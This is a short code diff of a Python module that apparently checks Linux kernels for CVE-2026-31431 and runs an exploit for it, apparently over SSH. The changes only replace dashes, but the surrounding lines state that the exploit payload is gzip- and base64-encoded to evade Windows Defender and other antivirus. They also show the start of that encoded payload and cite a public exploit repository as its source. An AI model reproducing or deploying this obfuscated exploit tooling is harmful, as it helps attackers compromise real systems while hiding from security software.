@@ -1,5 +1,5 @@
 """
-CVE-2026-31431 Copy Fail — Kernel checker and exploit runner.
+CVE-2026-31431 Copy Fail - Kernel checker and exploit runner.
 
 The exploit payload is gzip-compressed + base64-encoded to obfuscate
 known-bad signatures from Windows Defender and similar AV.
@@ -14,7 +14,7 @@ from .ssh_client import SSHClient
 
 logger = logging.getLogger(__name__)
 
-# CVE-2026-31431 PoC — gzip(base64) obfuscated to avoid AV signature match
+# CVE-2026-31431 PoC - gzip(base64) obfuscated to avoid AV signature match
 # Source: github.com/Sndav/CVE-2026-31431-Advanced-Exploit
 EXPLOIT_PAYLOAD_B64 = (
     "H4sIADaF+GkC/61ZbVPbSBL+rl8xp/sQKQhhg5NjXYE6inizVAjOAWFr1+tSydIIa5Elr2aM8br479c9"
